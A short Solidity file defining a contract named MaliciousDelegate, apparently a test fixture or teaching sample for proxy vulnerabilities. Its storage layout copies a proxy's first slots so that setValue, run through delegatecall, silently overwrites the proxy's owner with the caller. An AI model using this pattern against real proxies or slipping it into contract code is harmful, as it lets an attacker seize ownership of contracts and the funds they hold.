// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

contract MaliciousDelegate {
    // Keep layout aligned with proxy's first slots
    address public owner;
    address public implementation;
    uint256 public value;

    function setValue(uint256) external {
        // Overwrite slot 0 in caller context (proxy) via delegatecall
        owner = msg.sender;
    }
}
